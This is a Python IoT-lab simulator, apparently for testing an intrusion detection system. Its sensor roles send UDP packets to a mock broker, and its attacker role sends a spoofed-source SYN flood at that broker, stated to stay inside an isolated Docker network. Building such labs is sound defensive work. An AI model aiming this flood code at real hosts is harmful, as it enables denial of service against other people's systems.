"""
simulation/docker/iot_device/sim_device.py — small IoT-device simulator.

Roles (via DEVICE_ROLE env):
  temperature_sensor : periodically sends UDP "temperature" packets to the broker
  humidity_sensor    : same idea, humidity
  mqtt_broker        : listens for UDP packets on port 1883
  attacker           : ONLY when --attack is passed. Sends high-rate SYN floods
                       at the broker. Used to trigger the IDS.

All traffic stays INSIDE the docker iot_lab network (which is marked internal:true).
"""
from __future__ import annotations

import os
import sys
import time
import random

ROLE = os.environ.get("DEVICE_ROLE", "temperature_sensor")
POLL_INTERVAL = int(os.environ.get("POLL_INTERVAL", "5"))
BROKER_HOST = os.environ.get("BROKER_HOST", "iot_device_3")


def benign_loop(role: str, interval: int):
    """Periodically send small UDP packets to the broker."""
    from scapy.all import IP, UDP, Ether, send
    print(f"[{role}] benign loop every {interval}s -> {BROKER_HOST}:1883")
    seq = 0
    while True:
        msg = f"{role}:{seq}:{random.random():.3f}".encode()
        pkt = IP(dst=BROKER_HOST) / UDP(sport=53000 + random.randint(0, 200),
                                        dport=1883) / msg
        try:
            send(pkt, verbose=0)
        except Exception as e:
            print(f"[{role}] send error: {e}")
        seq += 1
        time.sleep(interval)


def broker_loop():
    """Listen on UDP 1883 and just print what arrives (no real MQTT)."""
    from scapy.all import sniff, UDP
    print("[broker] listening UDP 1883")
    def handler(pkt):
        if UDP in pkt and pkt[UDP].dport == 1883:
            try:
                payload = bytes(pkt[UDP].payload).decode(errors="replace")
            except Exception:
                payload = "?"
            print(f"[broker] from {pkt['IP'].src}:{pkt[UDP].sport} -> {payload}")
    try:
        sniff(filter="udp port 1883", prn=handler, store=0)
    except KeyboardInterrupt:
        print("[broker] stopped")


def attack_loop():
    """High-rate SYN flood at the broker. Lab-only."""
    from scapy.all import IP, TCP, send
    print(f"[attacker] SYN flood -> {BROKER_HOST}:1883 (isolated network only)")
    for burst in range(20):
        for i in range(200):
            pkt = IP(src="10.0.0.99", dst=BROKER_HOST) / TCP(
                sport=40000 + burst * 200 + i, dport=1883, flags="S"
            )
            send(pkt, verbose=0)
        time.sleep(0.1)
    print("[attacker] burst complete")


def main():
    if "--broker" in sys.argv or ROLE == "mqtt_broker":
        broker_loop()
        return
    if "--attack" in sys.argv or ROLE == "attacker":
        attack_loop()
        return
    benign_loop(ROLE, POLL_INTERVAL)


if __name__ == "__main__":
    main()
